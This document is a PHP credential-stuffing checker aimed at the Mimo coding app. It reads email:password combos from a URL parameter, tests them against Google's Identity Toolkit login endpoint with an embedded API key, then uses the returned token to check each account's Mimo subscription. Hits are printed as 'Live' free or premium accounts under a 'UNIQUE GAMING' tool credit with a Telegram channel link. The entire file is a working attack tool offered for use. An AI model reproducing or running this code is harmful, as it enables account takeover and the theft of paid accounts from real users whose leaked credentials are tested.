<?php

error_reporting(0);


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$USER = multiexplode(array(":", "|", ""), $lista)[0];
$PASS = multiexplode(array(":", "|", ""), $lista)[1];

function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];

$data = array(
    "email" => $USER,
    "password" => $PASS,
    "returnSecureToken" => true
);

$json_data = json_encode($data);

// The URL you want to send the POST request to
$url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmjHOtgjUJFO6Fvn6lLQDfzzVv21boYNY'; // Replace with your actual API endpoint

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); // Set the request method to POST
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data); // Set the JSON data as the request body
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json', // Set the content type to JSON
    'Content-Length: ' . strlen($json_data) // Set the content length
));

// Execute the cURL session and store the result in $response
$response = curl_exec($ch);

$jsonData = json_decode($response, true);

    $errorMessage = $jsonData['error']['message'];
  
if ($errorMessage === "EMAIL_NOT_FOUND") {
        echo '<span class="badge badge-danger">💀Dead💀</span> '.$USER.':'.$PASS.'<b> ❌ Declined ❌  </b>';
        exit; // or die; to stop code execution
    } elseif ($errorMessage === "INVALID_PASSWORD") {
                echo '<span class="badge badge-danger">💀Dead💀</span> '.$USER.':'.$PASS.'<b> ❌ Declined ❌  </b>';
  exit;
    } elseif ($errorMessage === "INVALID_EMAIL") {
                echo '<span class="badge badge-danger">💀Dead💀</span> '.$USER.':'.$PASS.'<b> ❌ Declined ❌  </b>';
  exit;
}

        $token = $jsonData['idToken'];
        $Name = $jsonData['displayName'];

$ch = curl_init();
$url = 'https://api.getmimo.com/v1/subscriptions';

// Define your headers as an array
$headers = array(
    'Host: api.getmimo.com', // Set the content type to JSON
    'Accept: application/json',
    'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.118 Mobile/15E148 Safari/604.1',
    'Authorization: Bearer '.$token,
);

// Set the URL
curl_setopt($ch, CURLOPT_URL, $url);

// Set headers
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Receive the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response2 = curl_exec($ch);

$json2 = json_decode($response2, true);

// Check if "isActive" is false
if ($json2['isActive'] === true) {
    
echo '<pre>
<span class="badge badge-success">#Live</span> 
-------------PREMIUM ACC---------------
EMAIL: ' . $USER . ' |
PASS: ' . $PASS . ' |
PREMIUM: FALSE   |
NAME: ' . $Name . '  |
TOOL BY: UNIQUE GAMING |
TELEGRAM CHANNEL: https://t.me/UNQCLOUD  |
-----------------------------------
<b  ❤PREMIUM❤  <br>
</pre>';
} else {
    
echo '<pre>
<span class="badge badge-success">#Live</span> 
--------------FREE ACC---------------
EMAIL: ' . $USER . ' |
PASS: ' . $PASS . ' |
PREMIUM: FALSE   |
NAME: ' . $Name . '  |
TOOL BY: UNIQUE GAMING |
TELEGRAM CHANNEL: https://t.me/UNQCLOUD  |
-----------------------------------
<b  ❤FREE❤  <br>
</pre>';
}

?>